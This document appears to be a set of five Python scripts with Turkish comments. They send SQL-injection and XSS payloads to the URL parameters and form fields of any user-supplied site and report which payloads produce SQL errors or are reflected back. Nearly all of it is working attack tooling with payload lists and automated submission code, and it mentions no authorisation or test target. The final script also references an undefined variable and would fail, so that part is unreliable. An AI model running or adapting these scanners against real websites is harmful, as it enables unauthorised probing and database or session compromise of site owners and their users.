# Sending SQL Payloads to URL Parameters with GET

```python
import requests
import re

file_path = "payloads.txt"
with open(file_path, "r") as file:
    file_content = file.readlines()

payloads = file_content


file_url = "url.txt"
# Dosyayı okuyun
with open(file_url, "r") as file:
    file_c = file.readlines()

urls = file_c


for url in urls:
    index_of_equals = url.find("=")  # "=" işaretinin index'ini bul

    for payload in payloads:
        new_url = url[:index_of_equals + 1] + payload
        response = requests.get(new_url)

        if re.search("You have an error in your SQL syntax", response.text):
            print("SQL injection tespit edildi: " + payload)
        else: 
            print("SQL injection bulunamadı: " + payload)

        # İsteğin sonucunu ekrana yazdır
        print(f"URL: {url} PAYLOAD: {payload}")
        print("-------------------------------------")
```

# Testing XSS Vulnerabilities in URL Parameters with GET

```python
import requests
fname = "xss_payloads.txt"
with open(fname) as f:
    content = f.readlines()
payloads = [x.strip() for x in content]

file_url = "url.txt"
# Dosyayı okuyun
with open(file_url, "r") as file:
    file_c = file.readlines()

urls = file_c

vuln = []

for url in urls:
    index_of_equals = url.find("=")  # "=" işaretinin index'ini bul
    for payload in payloads:
        xss_url = url[:index_of_equals + 1] + payload
        r = requests.get(xss_url)

        if payload.lower() in r.text.lower():
            print(f"XSS zafiyeti VAR! URL: {url}  Payload: {payload}")
            print("-----------------------")

            if(payload not in vuln):
                vuln.append(payload)

        else:
            print (f"XSS zafiyeti YOK! URL: {url}  Payload: {payload}")
            print("-----------------------")
```

# Testing SQL Injection in Input Fields with POST or GET 

```python
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "') OR ('1'='1' /*",
]

import requests
from bs4 import BeautifulSoup

def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')  # Tüm form elementleri bulunur ve döndürülür
    except requests.exceptions.RequestException as e:  # Hata durumunda hata mesajı yazdırılır
        print(f"Getirilirken hata oluştu {url}: {e}")
        return []

def get_form_inputs(form):  
    inputs = []
    for input_tag in form.find_all('input'):  # Formdaki her input elementi için döngü
        name = input_tag.get('name')
        if name:
            inputs.append(name)  # 'name' özelliği listeye eklenir
    return inputs

def send_payload(url, form, input_name, payload):
    form_data = {input_name: payload}  # Payload form verisi oluşturulur
    for input_tag in form.find_all('input'):
        if input_tag.get('name') and input_tag.get('name') != input_name:
            form_data[input_tag.get('name')] = 'test'  # Diğer input alanlarına dummy veri ekle
    
    action = form.get('action') or url
    method = form.get('method', 'post').lower()  # Formun metodu alınır, yoksa varsayılan 'post' atanır
    
    if not action.startswith('http'):  # Hareket URL değilse
        action = requests.compat.urljoin(url, action)  # Tam URL oluşturulur
    
    try:
        if method == 'post':
            response = requests.post(action, data=form_data) # POST isteği gönderilir
        else:  
            response = requests.get(action, params=form_data)
        
        return "error" in response.text.lower() or "syntax" in response.text.lower()
    except requests.exceptions.RequestException as e:
        print(f"Payload gönderilirken hata oluştu {url}: {e}")  # Yanıtta hata belirteci aranır
        return False

def test_sql_injection(url):
    forms = get_forms(url)  # URL'den tüm formları getirir
    for form in forms:  # Formdaki tüm input alanlarını alır
        input_fields = get_form_inputs(form)
        for input_name in input_fields:
            for payload in sql_payloads:  # SQL payload'larının her biri için döngü
                # Belirli bir payload ile bir POST veya GET isteği gönderir ve sonucu alır
                result = send_payload(url, form, input_name, payload)  
                if result: # Eğer SQL Injection açığı bulunursa
                    # Açık ve kullanılan payload bilgisi yazdırılır
                    print(f"SQL Injection açığı bulundu (input): '{input_name}' with payload: {payload}")
                else:
                    print(f"SQL Injection açığı bulunamadı (input): '{input_name}' with payload: {payload}")

def main():
    url = input("URL girin: ")
    test_sql_injection(url)

# Ana programın başlatılması
if __name__ == "__main__":
    main()
```

# Testing XSS Vulnerabilities in Input Fields with POST or GET  

```python
xss_payloads = [
    "<script>alert('XSS1')</script>",
    "<img src='x' onerror='alert(\"XSS2\")'>",
    "'\"><img src='x' onerror='alert(XSS3)'>",
    "<iframe onload='javascript:alert(XSS4)'></iframe>",
]

import requests
from bs4 import BeautifulSoup

def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print(f"Getirilirken hata oluştu {url}: {e}")
        return []

def get_form_inputs(form):
    inputs = []
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        if name:
            inputs.append(name)
    return inputs

def send_payload(url, form, input_name, payload):
    form_data = {input_name: payload}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') and input_tag.get('name') != input_name:
            form_data[input_tag.get('name')] = 'test'  # Diğer input alanlarına dummy veri ekle
    
    action = form.get('action') or url
    method = form.get('method', 'post').lower()
    
    if not action.startswith('http'):
        action = requests.compat.urljoin(url, action)
    
    try:
        if method == 'post':
            response = requests.post(action, data=form_data)
        else:
            response = requests.get(action, params=form_data)
        
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print(f"Payload gönderilirken hata oluştu {url}: {e}")
        return False

def test_xss(url):
    forms = get_forms(url)
    for form in forms:
        input_fields = get_form_inputs(form)
        for input_name in input_fields:
            for payload in xss_payloads:
                result = send_payload(url, form, input_name, payload)
                if result:
                    print(f"XSS açığı bulundu (input): '{input_name}' payload: {payload}")
                else:
                    print(f"XSS açığı bulunamadı (input): '{input_name}' payload: {payload}")

def main():
    url = input("URL girin: ")
    test_xss(url)

if __name__ == "__main__":
    main()
```

# Testing XSS and SQL Injection with POST Requests

```python
import requests

# SQL Injection payload'ları
sql_payloads = [
    "admin' OR '1'='1",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "admin' OR 1=1--"
]

# XSS payload'ları
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>"
]

def send_payload(url, payload):
    data = {'input': payload}
    try:
        response = requests.post(url, data=data)
        if payload in response.text:
            print(f"Açık Bulundu: {payload}")
        else:
            print(f"Açık bulunamadı: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"Payload göndermede hata {url}: {e}")
        
def test_payloads(url, sql_payloads, xss_payloads):
    
    print("SQL Injection payloadları test ediliyor...")
    for payload in sql_payloads:
        send_payload(url, payload)
    
    print("XSS payloadları test ediliyor...")
    for payload in xss_payloads:
        send_payload(url, payload)
        
def main():
    url = input("URL girin: ")
    
    if '=' in url:
        index_of_equals = url.find("=")
        url = url[:index_of_equals + 1] + payload
        test_payloads(url, sql_payloads, xss_payloads)
    else:
        test_payloads(url, sql_payloads, xss_payloads)
        
if __name__ == "__main__":
    main()
```
